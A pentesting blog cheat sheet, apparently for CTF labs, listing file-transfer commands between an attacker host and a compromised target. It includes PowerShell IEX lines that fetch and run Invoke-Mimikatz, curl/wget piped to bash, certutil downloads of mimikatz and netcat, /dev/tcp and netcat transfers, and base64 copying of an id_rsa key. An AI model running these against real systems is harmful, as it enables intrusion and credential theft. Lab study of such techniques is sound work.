---
title: "Cheat Sheet - File Transfer"
author: Nasrallah
description: ""
date: 2025-05-13 07:00:00 +0000
categories : [CheatSheet]
tags: [CheatSheet, linux, windows]
img_path: /assets/img/cheatsheet
image:
    path: banner.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

## Setting up servers

This section covers the different ways to setup our servers to transfer files.

### HTTP

The following commands are used to setup an HTTP server.

```bash
python3 -m http.server 8000
python2.7 -m SimpleHTTPServer
ruby -run -ehttpd . -p 80
php -S 0.0.0.0:80
```

To setup an HTTPS server we can use openssl.

First we create a certificate using the following command:

```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

The following command listens on port 8000 and server the file `linpeas.sh`

```bash
openssl s_server -quiet -accept 8000 -cert certificate.pem -key key.pem < linpeas.sh
```

### SMB server

To setup an SMB server we can use `Impacket`

```bash
sudo impacket-smbserver share -smb2support ./
```

To add authentication with a username and a password we can add the following options.

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

### SSH server

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```

### Upload server

The following command is used to setup `uploadserver` which is a python module that acts as an upload server that is used to transfer files from the victims machine to our attacking machine.

To install the module use the following command.

```bash
pipx install uploadserver
```

Setup a server.

```bash
uploadserver
```

To upload files using HTTPS we can create a certificate using `openssl` then instruct `uploadserver` to use it.

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

uploadserver 443 --server-certificate ~/server.pem
```

> Note that the certificate should be at a different directory from where you're running the command.

Before we start, let's consider the attacker's ip to be `10.10.10.10` and the victim's ip is `9.9.9.9`

## Windows File Transfer

### PowerShell/cmd

```cmd
certutil -urlcache -f http://10.10.10.10/mimikatz.exe .\mimikatz.exe
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:/nc.exe C:\Windows\Temp\nc.exe
```

```powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.10.10/mimikatz.exe', 'C:\Users\Public\mimikatz.exe')
(New-Object Net.WebClient).DownloadFileAsync('http://10.10.10.10/mimikatz.exe', 'C:\Users\Public\mimikatz.exe')
Invoke-WebRequest "http://10.10.10.10/mimikatz.exe" -OutFile 'C:\Users\Public\mimikatz.exe'Invoke-WebRequest "http://10.10.10.10/mimikatz.exe" -OutFile 'C:\Users\Public\mimikatz.exe'
iwr "http://10.10.10.10/mimikatz.exe" -OutFile 'C:\Users\Public\mimikatz.exe'
curl "http://10.10.10.10/mimikatz.exe" -OutFile 'C:\Users\Public\mimikatz.exe'
wget "http://10.10.10.10/mimikatz.exe" -OutFile 'C:\Users\Public\mimikatz.exe'
```

Other option for `WebClient` are: [`OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0) - [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0) - [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0) - [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0) - [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0) - [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)`

To Download and execute without writing to the disk we can use IEX(**Invoke Expression**).

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://10.10.10.10/Invoke-Mimikatz.ps1')
(New-Object Net.WebClient).DownloadString('https://10.10.10.10/Invoke-Mimikatz.ps1') | IEX
```

#### Base64

For small file we can use base64 encoding for easy transfer.

We encode the data like this:

```bash
cat id_rsa |base64 -w 0;echo
```

We copy the base64 string and paste it to the following command to decode it and save it to a file.

```cmd
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("BASE64+STRING+HERE"))
```

### SMB

Now we can copy files to the windows target.

```powershell
copy \\10.10.10.10\\share\\mimikatz.exe
```

For errors like "security policy" or "path doesn't exist" use the server with credentials and mount the share.

```shell
net use \\10.10.10.10\\share /user:hacker hacker
copy \\10.10.10.10\\share\\mimikatz.exe
```

## Linux File Transfer

### Through HTTP

The next commands are used to download `linpeas.sh` from the compromised machine.

```shell
wget http://10.10.10.10/linpeas.sh
curl http://10.10.10.10/linpeas.sh -o linpeas.sh
```

Download files using code

```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://10.10.10.10/linpeas.sh", "linpeas.sh")'
python2.7 -c 'import urllib;urllib.urlretrieve ("http://10.10.10.10/linpeas.sh", "linpeas.sh")'
php -r 'file_put_contents("file.txt",file_get_contents("http://10.10.14.189/file.txt"));'
php -r 'const BUFFER = 1024; $fremote = fopen("http://10.10.10.10/linpeas.sh", "rb"); $flocal = fopen("linpeas.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("http://10.10.10.10/linpeas.sh")))'
perl -e 'use LWP::Simple; getstore("http://10.10.10.10/LinEnum.sh", "linpeas.sh");'
```

```bash
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /linpeas.sh HTTP/1.1\n\n">&3
cat <&3 | sed '1,/^\r$/d' > linpeas.sh
```

Execute the file without writing to the disk

```bash
wget -qO- http://10.10.10.10/linpeas.sh | bash
curl -s http://10.10.10.10/linpeas.sh | bash
```

### Netcat listener

Attacking machine listening.

```bash
nc -lvnp 1234 -q 0 < linpeas.sh
```

Target machine connecting

```bash
nc 10.10.10.10 1234 > linpeas.sh
cat < /dev/tcp/10.10.10.10/1234 > linpeas.txt
```

Target machine listening

```bash
nc -lvnp 1234 > linpeas.sh
```

Attacking machine connecting

```bash
cat linpeas.sh > /dev/tcp/9.9.9.9/1234
nc 9.9.9.9 1234 < file.txt
```

### SSH/SCP

```bash
scp attacker@attacker:/home/attacker/linpeas.sh . 
```

### Exfiltration w/ uploader

Working on it...

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
